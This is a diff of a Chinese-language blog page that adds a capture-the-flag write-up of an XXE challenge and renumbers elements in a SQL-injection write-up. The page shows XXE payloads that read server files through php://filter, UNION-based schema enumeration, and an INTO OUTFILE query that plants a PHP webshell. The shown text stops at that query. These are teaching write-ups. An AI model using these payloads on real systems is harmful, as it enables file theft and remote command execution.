@@ -3610,6 +3610,188 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-21 20:15:00+00:00">2026-11-21</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../xxe/" class="md-meta__link">XXE</a>, 
+              <a href="./" class="md-meta__link">Web</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="nctf2019-fake-xml-cookbook"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/">[NCTF2019] Fake XML cookbook — 名字就是答案</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：XXE（XML 外部实体注入）</p>
+<p><strong>Flag</strong>：<code>CTF2{72a5521b-e903-46b6-a937-056b82c51205}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#_1">题目概述</a></h3>
+<p><strong>题名里直接写着 <code>XML</code>。</strong></p>
+<p><strong>这种“名字就是考点”的题，先别急着找别的洞——就按它说的方向走。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#_2">解题过程</a></h3>
+<h4 id="step-1-xml"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#step-1-xml">Step 1：确认请求体是 XML</a></h4>
+<p><strong>页面源码里翻到登录逻辑，提交方式很明确：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;user&gt;&lt;username&gt;"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&lt;/username&gt;&lt;password&gt;"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&lt;/password&gt;&lt;/user&gt;"</span><span class="p">;</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="w">  </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">"post"</span><span class="p">,</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="w">  </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="s2">"doLogin.php"</span><span class="p">,</span>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="w">  </span><span class="nx">contentType</span><span class="o">:</span><span class="w"> </span><span class="s2">"application/xml"</span><span class="p">,</span>
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="w">  </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span>
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="p">})</span>
+</span></code></pre></div>
+<p><strong>三件事对上了：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>请求体是 XML           ← 拼接出来的标签结构
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>Content-Type 是 xml    ← application/xml
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>数据直接拼进去          ← 没有转义
+</span></code></pre></div>
+<p><strong>XML + 可控输入 = 先试 XXE。</strong></p>
+<h4 id="step-2"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#step-2">Step 2：加声明和引用，验证漏洞</a></h4>
+<p><strong>抓包，把请求体改成：</strong></p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x "12"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<p><strong>返回里 <code>msg</code> 变成了 <code>12</code>——说明实体被解析了，DTD 是生效的。</strong></p>
+<p><strong>第一步验证完成：这里能定义实体，也就能定义</strong>外部<strong>实体。</strong></p>
+<h4 id="step-3"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#step-3">Step 3：先读源码，确认为什么登录没用</a></h4>
+<p><strong>响应头带着 <code>PHP</code>，所以可以用 PHP 的伪协议。</strong></p>
+<p><strong>但要注意一个前提：</strong>外部实体读的是“文件原文”，<strong>不会经过 PHP 解析</strong>。想读源码就必须先 base64 编码，否则 <code>&lt;?php ... ?&gt;</code> 会被当成 XML 标签吞掉。**</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<p><strong>把返回的 base64 解出来，就是 <code>doLogin.php</code> 的源码：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="x">$USERNAME = 'admin';</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="x">$PASSWORD = '024b87931a03f738fff6693ce0a78c88';</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="x">$result = null;</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="x">libxml_disable_entity_loader(false);</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="x">$xmlfile = file_get_contents('php://input');</span>
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="x">try {</span>
+</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="x">    $dom = new DOMDocument();</span>
+</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="x">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span>
+</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="x">    $creds = simplexml_import_dom($dom);</span>
+</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="x">    $username = $creds-&gt;username;</span>
+</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a><span class="x">    $password = $creds-&gt;password;</span>
+</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>
+</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a><span class="x">    if ($username == $USERNAME &amp;&amp; $password == $PASSWORD) {</span>
+</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a><span class="x">        $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;", 1, $username);</span>
+</span><span id="__span-34-17"><a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a><span class="x">    } else {</span>
+</span><span id="__span-34-18"><a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a><span class="x">        $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;", 0, $username);</span>
+</span><span id="__span-34-19"><a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a><span class="x">    }</span>
+</span><span id="__span-34-20"><a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a><span class="x">} catch (Exception $e) {</span>
+</span><span id="__span-34-21"><a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a><span class="x">    $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;", 3, $e-&gt;getMessage());</span>
+</span><span id="__span-34-22"><a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>两个关键配置：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="x">libxml_disable_entity_loader(false);   // 允许加载外部实体</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="x">LIBXML_NOENT | LIBXML_DTDLOAD          // 替换实体 + 加载 DTD</span>
+</span></code></pre></div>
+<p><strong>这就是漏洞的根源。</strong></p>
+<h4 id="step-4"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#step-4">Step 4：账号密码是假的线索</a></h4>
+<p><strong>源码里确实有账号和 md5 密码，但登进去没有任何东西——flag 不在数据库里，在文件系统上。</strong></p>
+<p><strong>所以这条路走完就丢掉，别在登录上耗时间。</strong></p>
+<h4 id="step-5-flag"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#step-5-flag">Step 5：直接读 flag</a></h4>
+<p><strong>把 <code>resource=</code> 换成 flag 文件即可：</strong></p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<p><strong>base64 解码：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>CTF2{72a5521b-e903-46b6-a937-056b82c51205}
+</span></code></pre></div>
+<p><strong>如果 flag 文件里都是纯文本、没有 <code>&lt;</code>，也可以直接 <code>SYSTEM "file:///flag"</code>，省掉编码这一步。</strong></p>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>识别</td>
+<td>题名 + <code>Content-Type: application/xml</code> + 拼接请求体</td>
+</tr>
+<tr>
+<td>验证</td>
+<td>内部实体 <code>&lt;!ENTITY x "12"&gt;</code> 能生效，就说明 DTD 没关</td>
+</tr>
+<tr>
+<td>读源码</td>
+<td><code>php://filter/read=convert.base64-encode/resource=xxx</code></td>
+</tr>
+<tr>
+<td>为什么编码</td>
+<td>外部实体读的是原文，<code>&lt;?php</code> 会破坏 XML 结构</td>
+</tr>
+<tr>
+<td>漏洞根源</td>
+<td><code>libxml_disable_entity_loader(false)</code> + <code>LIBXML_NOENT</code></td>
+</tr>
+<tr>
+<td>登录没用</td>
+<td>账号密码是真的，但 flag 不在库里</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整 payload</summary>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>POST /doLogin.php
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>Content-Type: application/xml
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 只声明实体，不写 <code>&amp;x;</code></strong></p>
+<p><strong>实体是“登记”，引用才是“取值”。</strong>不引用，服务器根本不会去读文件。</p>
+<p><strong>② 用 <code>file://</code> 读 PHP 源码</strong></p>
+<p>读到的是原文，但 <code>&lt;?php</code> 会被当成 XML 标签，解析直接炸。<strong>读源码必须走 <code>php://filter</code> + base64。</strong></p>
+<p><strong>③ 拿账号密码去登录</strong></p>
+<p><strong>那是干扰项。</strong>flag 在文件里，不在数据库里。</p>
+<p><strong>④ 忘了 <code>LIBXML_NOENT</code></strong></p>
+<p>源码里 <code>loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD)</code> —— 少了 <code>LIBXML_NOENT</code> 实体不会被替换，你只能看到 <code>&amp;x;</code> 本身。</p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-20 16:15:00+00:00">2026-11-20</time></li>
         
           <li class="md-meta__item">
@@ -3640,67 +3822,67 @@
 <hr />
 <h3 id="_1"><a class="toclink" href="../../myctf-stellar-archive-sqli/#_1">题目概述</a></h3>
 <p>页面底部有个“终端”入口，进去是一块维护控制台。<strong>提示是日语的，先翻译：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>$ archive --status
-</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>[ ok ] 名鑑検索サービス: alive
-</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)
-</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>
-</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>$ archive --storage
-</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>[info] エクスポート一時領域: /io/（書き込みは export 機能の実装後）
-</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>[info] 検索サービス本体は名鑑フロントから未接続
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>$ archive --status
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>[ ok ] 名鑑検索サービス: alive
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>$ archive --storage
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>[info] エクスポート一時領域: /io/（書き込みは export 機能の実装後）
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>[info] 検索サービス本体は名鑑フロントから未接続
 </span></code></pre></div>
 <p><strong>翻译过来关键的就一行：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>导出临时区域：/io/（写入需在 export 功能实现后）
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>导出临时区域：/io/（写入需在 export 功能实现后）
 </span></code></pre></div>
 <p><strong>这句话等于提前告诉你：</strong><code>/io/</code> 目录可写<strong>。</strong>后面所有操作都是围着这一句展开的。**</p>
 <hr />
 <h3 id="_2"><a class="toclink" href="../../myctf-stellar-archive-sqli/#_2">解题过程</a></h3>
 <h4 id="step-1"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-1">Step 1：找注入点</a></h4>
 <p><strong>页面有个筛选框，输入 <code>rarity &gt;= 3</code> 会返回一段 JSON，里面把拼好的 SQL 也打出来了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>SELECT id, name, title, rarity, element, sig FROM witches WHERE rarity &gt;= 3 ORDER BY id ASC
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>SELECT id, name, title, rarity, element, sig FROM witches WHERE rarity &gt;= 3 ORDER BY id ASC
 </span></code></pre></div>
 <p><strong>输一个单引号（<code>'</code>），报错——注入点确认。</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-2">Step 2：确定列数</a></h4>
 <p><strong>原查询是 6 个字段（id, name, title, rarity, element, sig），所以 UNION 也要 6 列：</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
 </span></code></pre></div>
 <p><strong>能正常返回，说明列数对上了。</strong></p>
 <h4 id="step-3"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-3">Step 3：爆库表列</a></h4>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
 </span></code></pre></div>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">COLUMN_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">'archive_notes'</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">COLUMN_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">'archive_notes'</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><strong><code>-- -</code> 是注释掉后面原来的 <code>ORDER BY id ASC</code>（注意 <code>--</code> 后面必须有一个空格）。</strong></p>
 <p><strong>扫出来的表里，与题目相关的就两张：<code>witches</code>（正常数据）和 <code>archive_notes</code>（看起来像隐藏内容）。</strong></p>
 <h4 id="step-4flag"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-4flag">Step 4：库里的“flag”是假的</a></h4>
 <p><strong>读 <code>archive_notes</code>，看到这么一条：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>封存样本（校验用，非本季名鉴凭证）：MYCTF{d3c0y_4rch1v3_n0t3_d0_n0t_submit}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>封存样本（校验用，非本季名鉴凭证）：MYCTF{d3c0y_4rch1v3_n0t3_d0_n0t_submit}
 </span></code></pre></div>
 <p><strong>注意它自己写着 <code>d3c0y_..._d0_n0t_submit</code>——</strong>这是<strong>诱饵</strong>，交上去就是错的。**</p>
 <p><strong>这题的 flag 不在数据库里。</strong></p>
 <h4 id="step-5"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-5">Step 5：看看能不能写文件</a></h4>
 <p><strong>既然提示说 <code>/io/</code> 可写，先确认数据库的写权限目录：</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><strong>返回：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>/var/www/html/io/
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>/var/www/html/io/
 </span></code></pre></div>
 <p><strong><code>@@secure_file_priv</code> 就是 MySQL/MariaDB 允许 <code>INTO OUTFILE</code> 写入的目录——和终端里那行提示</strong>完全对上<strong>了。</strong></p>
 <p><strong>这说明出题人是故意把这条路留给你。</strong></p>
 <h4 id="step-6-webshell"><a class="toclink" href="../../myctf-stellar-archive-sqli/#step-6-webshell">Step 6：写一个 webshell</a></h4>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
